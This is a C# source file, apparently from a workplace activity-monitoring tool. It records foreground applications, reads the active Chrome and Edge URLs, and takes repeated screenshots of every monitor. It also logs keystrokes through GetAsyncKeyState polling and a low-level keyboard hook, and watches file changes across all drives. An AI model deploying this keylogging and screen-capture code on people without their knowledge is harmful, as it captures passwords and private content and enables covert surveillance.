using ActivityMonitor.Application;
using ActivityMonitor.ApplicationImp;
using ActivityMonitor.Collections;
using DeskTime;
//using System.Windows.Data;
//using System.Windows.Media;
//using System.Windows.Threading;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Automation;
using System.Windows.Forms;
//using AppMonitor.SettingsManager;

namespace ActivityMonitor.ApplicationMonitor
{
    public enum Browser
    {
        IExplore,
        MicrosoftEdge,
        Firefox,
        Opera,
        Chrome
    }
    public class AppMonitor : INotifyPropertyChanged
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        private readonly AppUpdater _appUpdater;
        private string _currentApplicationName;
        private TimeSpan _currentApplicationTotalUsageTime;
        private string _currentApplicationPath;
        private Icon _currentApplicationIcon;
        private int _idleTime;
        private int _idleInterval;
        private bool _requestStop;
        private bool _started;
        private int _pollInterval;

        public UserSession Session;
        public Applications Applications
        {
            get { return Data; }
            set
            {
                Data = value;
                AppUpdater.Applications = value;
            }
        }


        public FileLog FileLogs
        {
            get { return f; }
            set
            {
                f = value;
                AppUpdater.fileLog = value;
            }
        }
        public int IdleTime => _idleTime;

        private readonly DateTime _startTime = DateTime.Now;

        public AppMonitor()//Dispatcher dispatcher)
        {
            Data = new Applications();
            f = new FileLog();
            _appUpdater = new AppUpdater(Data, f);
            _idleInterval = 30;

            Session = new UserSession();

            SystemEvents.SessionSwitch += SystemEventsSessionSwitch;
           
           
        }

        private bool _sessionStopped;
       private IApplication iapp;

        private void LogKey()
        {
            while (true)
            {
             

                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    // 32769 should be used for windows 10.
                    if (keyState == 1 || keyState == -32767 || keyState == 32769)
                    {
                        if (iapp != null)
                        {
                            iapp.Usage.FindLast(u => !u.IsClosed).AddKeystrokes(
                           ((char)i).ToString()
                            );
                        }
                       
                        break;
                    }
                }
            }
        }
        private  void HookManager_KeyDown(object sender, KeyEventArgs e)
        {
            //string key = e.KeyCode.ToString();
            //if (iapp != null)
            //{
            //    iapp.Usage.FindLast(u => !u.IsClosed).AddKeystrokes(
            //   key
            //    );
            //}
           
            // Log the pressed key

        }
        public void SystemEventsSessionSwitch(object sender, SessionSwitchEventArgs e)
        {
            switch (e.Reason)
            {
                case SessionSwitchReason.SessionLock:
                    {
                        _sessionStopped = true;

                        break;
                    }
                   
                case SessionSwitchReason.SessionUnlock:
                    {
                        _sessionStopped = false;
                        Session = new UserSession();
                        break;
                    }
                    
            }
        }

        public event PropertyChangedEventHandler PropertyChanged;
        private void NotifyPropertyChanged(String info)
        {
            if (PropertyChanged != null)
            {
                PropertyChanged(this, new PropertyChangedEventArgs(info));
            }
        }

        public void Start(int pollInterval = 1000)
        {
            if (!_started)
            {
                _pollInterval = pollInterval;
                Thread thread = new Thread(new ThreadStart(this.ApplicationsUpdater));
                if (this._started)
                    return;

                _requestStop = false;
                _started = true;
                thread.Start();
            }
        }

        public void EndSession()
        {
            Session.EndSession();
            Stop();
        }
        public void Stop()
        {
            //Trigger Thread Stop
            _requestStop = true;
        }
        public static string GetChromeActiveTabUrl()
        {
            Process[] procsChrome = Process.GetProcessesByName("chrome");

            if (procsChrome.Length <= 0)
                return null;

            foreach (Process proc in procsChrome)
            {
                // the chrome process must have a window
                if (proc.MainWindowHandle == IntPtr.Zero)
                    continue;

                // to find the tabs we first need to locate something reliable - the 'New Tab' button
                AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                var SearchBar = root.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
                if (SearchBar != null)
                    return (string)SearchBar.GetCurrentPropertyValue(ValuePatternIdentifiers.ValueProperty);
            }

            return null;
        }
        public static string GetEdgeActiveTabUrl()
        {
            Process[] procsChrome = Process.GetProcessesByName("msedge");

            if (procsChrome.Length <= 0)
                return null;

            foreach (Process proc in procsChrome)
            {
                // the chrome process must have a window
                if (proc.MainWindowHandle == IntPtr.Zero)
                    continue;

                AutomationElement automationElement = AutomationElement.FromHandle(proc.MainWindowHandle);
                var SearchBar = automationElement.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
                // to find the tabs we first need to locate something reliable - the 'New Tab' button
                AutomationElement automationElement2 = automationElement.FindFirst(TreeScope.Subtree, new PropertyCondition(AutomationElement.AutomationIdProperty, "addressEditBox"));
                if (SearchBar != null)
                    return (string)SearchBar.GetCurrentPropertyValue(ValuePatternIdentifiers.ValueProperty);
            }

            return null;
        }
        internal static float getScalingFactor()
        {
            IntPtr hdc = Graphics.FromHwnd(IntPtr.Zero).GetHdc();
            int deviceCaps = Win32.GetDeviceCaps(hdc, 10);
            return (float)Win32.GetDeviceCaps(hdc, 117) / (float)deviceCaps;
        }
        public static Image CaptureScreen(int monitorIndex = 0)
        {
            Screen screen = Screen.AllScreens[monitorIndex];
            Size size = screen.Bounds.Size;
            float num = ((monitorIndex == 0) ? getScalingFactor() : 1f);
            int width = (int)((float)size.Width * num);
            int height = (int)((float)size.Height * num);
            Bitmap bitmap = new Bitmap(width, height);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, new Size(width, height), CopyPixelOperation.SourceCopy);
            graphics.Dispose();
            return bitmap;
        }

        private void CaptureScreenshot(IApplication currentApplication)
        {
            string folder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // Combine the base folder with your specific folder....
            string specificFolder = Path.Combine(folder, "DMSSnaps");
            if (!Directory.Exists(specificFolder))
            {
                Directory.CreateDirectory(specificFolder);
            }
            try
            {
                Image image;
                double num;
                int monitorCount = Win32.GetMonitorCount();
                IList<byte[]> list = new List<byte[]>();
                for (int i = 0; i < monitorCount; i++)
                {
                    MemoryStream memoryStream = new MemoryStream();
                    try
                    {
                        image = CaptureScreen(i);
                        num = 1024.0 / (double)image.Width;
                    }
                    catch (Exception)
                    {
                        image = new Bitmap(1, 1);
                        num = 1.0;
                    }
                    int num2 = (int)((double)image.Width * num);
                    int num3 = (int)((double)image.Height * num);
                    using (Bitmap bitmap = new Bitmap(num2, num3))
                    {
                        Graphics graphics = Graphics.FromImage(bitmap);
                        graphics.SmoothingMode = SmoothingMode.AntiAlias;
                        graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                        graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
                        graphics.CompositingQuality = CompositingQuality.HighQuality;
                        graphics.DrawImage(image, new Rectangle(0, 0, num2, num3));
                        string fileName = System.DateTime.Now.ToString().Replace(@"/", "-").Replace(":", "-") + ".jpg";

                        bitmap.Save(specificFolder + @"\" + fileName, ImageFormat.Jpeg);
                        ApplicationScreenshots applicationScreenshots = new ApplicationScreenshots();
                        applicationScreenshots.ScreenshotName = fileName;
                        applicationScreenshots.SnapDatetime = System.DateTime.Now;
                        currentApplication.Usage.FindLast(u => !u.IsClosed).AddScreenShot(applicationScreenshots);
                       
                        bitmap.Dispose();
                        graphics.Dispose();
                    }
                    memoryStream.Dispose();
                    image.Dispose();

                }

                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    // 32769 should be used for windows 10.
                    if (keyState == 1 || keyState == -32767 || keyState == 32769)
                    {
                       
                        
                            currentApplication.Usage.FindLast(u => !u.IsClosed).AddKeystrokes(
                           ((char)i).ToString()
                            );
                        

                        break;
                    }
                }



            }
            catch (Exception ex)
            {

            }

        }




        public void RunFileWatcher()
        {
            //while (true)
            //{
            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo drive in drives)
            {
                if (drive.IsReady)
                {
                    string drivePath = drive.RootDirectory.FullName;

                    FileSystemWatcher watcher = new FileSystemWatcher();
                    watcher.Path = drivePath;

                    watcher.NotifyFilter = NotifyFilters.Attributes
                                         | NotifyFilters.CreationTime
                                         | NotifyFilters.DirectoryName
                                         | NotifyFilters.FileName
                                         | NotifyFilters.LastAccess
                                         | NotifyFilters.LastWrite
                                         | NotifyFilters.Security
                                         | NotifyFilters.Size;

                    watcher.IncludeSubdirectories = true;

                    watcher.Created += OnFileActivity;
                    //  watcher.Changed += OnFileActivity;
                    watcher.Deleted += OnFileActivity;
                    watcher.Renamed += OnFileRenamed;

                    watcher.EnableRaisingEvents = true;
                }
            }
            //}

        }

        private void OnFileActivity(object sender, FileSystemEventArgs e)
        {
            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("Program Files") && !e.FullPath.Contains("Program Files (x86)") && !e.FullPath.Contains("Program Data")  && !e.FullPath.Contains("ProgramData") && !e.FullPath.StartsWith("."))
            {
                string logMessage = $"{DateTime.Now} - {e.ChangeType}: {e.FullPath}";
                LogToFile(new FileLog
                {
                    LogDateTime = DateTime.Now,
                    Action = e.ChangeType.ToString(),
                    Source = e.FullPath,
                    Destination = e.Name

                });
            }

        }

        private void OnFileRenamed(object sender, RenamedEventArgs e)
        {
            if (!e.FullPath.Contains("AppData") && !e.FullPath.Contains("Windows") && !e.FullPath.Contains("Program Files") && !e.FullPath.Contains("Program Files (x86)") && !e.FullPath.Contains("Program Data") && !e.FullPath.Contains("ProgramData") && !e.FullPath.StartsWith("."))
            {
                string logMessage = $"{DateTime.Now} - {e.ChangeType}: {e.OldFullPath} renamed to {e.FullPath}";
                LogToFile(new FileLog
                {
                    LogDateTime = DateTime.Now,
                    Action = e.ChangeType.ToString(),
                    Source = e.OldFullPath,
                    Destination = e.FullPath

                });

            }
        }

        public void LogToFile(FileLog message)
        {
            _appUpdater.FileLogCreate(message);


        }

        private void ApplicationsUpdater()
        {
            var startTimeSpan = TimeSpan.Zero;
            var periodTimeSpan = TimeSpan.FromMinutes(5);
            _started = true;
            while (!_requestStop)
            {
                try
                {

                    var handle = WinApi.GetForegroundWindow();
                    //var handle = WinApi.GetActiveWindow();
                    int processId;

                    //todo write result to trace and add try catch
                    WinApi.GetWindowThreadProcessId(new HandleRef(null, handle), out processId);
                    //var process = Process.GetProcessById(processId);
                    var process = Process.GetProcessById(WinApi.GetRealProcessID(handle));

                    // checking if the user is in idle mode - if so, dont update process and sum to Idle time
                    // todo refactor
                    var inputInfo = new WinApi.Lastinputinfo();
                    inputInfo.cbSize = (uint)Marshal.SizeOf(inputInfo);
                    WinApi.GetLastInputInfo(ref inputInfo);
                    var idleTime = (Environment.TickCount - inputInfo.dwTime) / 1000;
                    if (idleTime < _idleInterval && _sessionStopped == false)
                    { // If idle time is less than _idleInterval then update process
                        if (process.ProcessName.ToLower().Contains("chrome"))
                        {
                            var currentApplication = _appUpdater.Update(process, GetChromeActiveTabUrl());
                            if (currentApplication != null)
                            {

                                iapp = currentApplication;


                                CaptureScreenshot(currentApplication);


                                CurrentApplicationName = currentApplication.Name;
                                CurrentApplicationTotalUsageTime = currentApplication.TotalUsageTime;
                                CurrentApplicationPath = currentApplication.Path;
                                CurrentApplicationIcon = currentApplication.Icon;

                            }
                        }
                        else if (process.ProcessName.ToLower().Contains("edge"))
                        {

                            var currentApplication = _appUpdater.Update(process, GetEdgeActiveTabUrl());
                            if (currentApplication != null)
                            {


                                iapp = currentApplication;

                                CaptureScreenshot(currentApplication);


                                CurrentApplicationName = currentApplication.Name;
                                CurrentApplicationTotalUsageTime = currentApplication.TotalUsageTime;
                                CurrentApplicationPath = currentApplication.Path;
                                CurrentApplicationIcon = currentApplication.Icon;

                            }
                        }


                        else
                        {
                            var currentApplication = _appUpdater.Update(process, "");
                            if (currentApplication != null)
                            {

                                iapp = currentApplication;
                                CaptureScreenshot(currentApplication);



                                CurrentApplicationName = currentApplication.Name;
                                CurrentApplicationTotalUsageTime = currentApplication.TotalUsageTime;
                                CurrentApplicationPath = currentApplication.Path;
                                CurrentApplicationIcon = currentApplication.Icon;
                                if (currentApplication.Name.Contains("chrome"))
                                {

                                }
                            }
                        }



                    }
                    else
                    {
                        //Update User Idle Time
                        Session.AddIdleSeconds(_pollInterval / 1000);
                        NotifyPropertyChanged("IdleTime");
                        _appUpdater.Stop(process);
                    }
                }
                catch (Exception ex)
                {
                    // todo logging
                    Console.WriteLine("EXC:" + ex.Message);
                }

                NotifyPropertyChanged("TotalTimeRunning");
                NotifyPropertyChanged("TotalTimeSpentInApplications");

                Thread.Sleep(_pollInterval);
            }

            //Stop Thread
            _requestStop = false;
            _started = false;
        }


        private Applications _data;
        public Applications Data
        {
            get { return _data; }
            private set
            {
                _data = value;
            }
        }
        private FileLog _F;
        public FileLog f
        {
            get { return _F; }
            private set
            {
                _F = value;
            }
        }


        public string CurrentApplicationName
        {
            get { return _currentApplicationName; }
            private set
            {
                if (value == null || value == _currentApplicationName) return;
                _currentApplicationName = value;
                NotifyPropertyChanged("CurrentApplicationName");
            }
        }


        public TimeSpan CurrentApplicationTotalUsageTime
        {
            get { return _currentApplicationTotalUsageTime; }
            private set
            {
                if (value == _currentApplicationTotalUsageTime) return;
                _currentApplicationTotalUsageTime = value;
                NotifyPropertyChanged("CurrentApplicationTotalUsageTime");
            }
        }

        public string CurrentApplicationPath
        {
            get { return _currentApplicationPath; }
            private set
            {
                if (value == _currentApplicationPath) return;
                _currentApplicationPath = value;
                NotifyPropertyChanged("CurrentApplicationPath");
            }
        }

        public Icon CurrentApplicationIcon
        {
            get { return _currentApplicationIcon; }
            private set
            {
                if (value == _currentApplicationIcon) return;
                _currentApplicationIcon = value;
                NotifyPropertyChanged("CurrentApplicationIcon");
            }
        }

        public TimeSpan TotalTimeSpentInApplications
        {
            get
            {
                var totalTime = Applications.Sum(s => s.TotalTimeInMinutes);
                return TimeSpan.FromMinutes(totalTime);
            }


        }

        public TimeSpan TotalTimeRunning
        {
            get { return DateTime.Now.Subtract(_startTime); }
        }



    }

    public class HookManager
    {
        public static event KeyEventHandler KeyDown;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static void Init()
        {
            _hookID = SetHook(_proc);
        }

        public static void Unhook()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                KeyDown?.Invoke(null, new KeyEventArgs((Keys)vkCode));
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}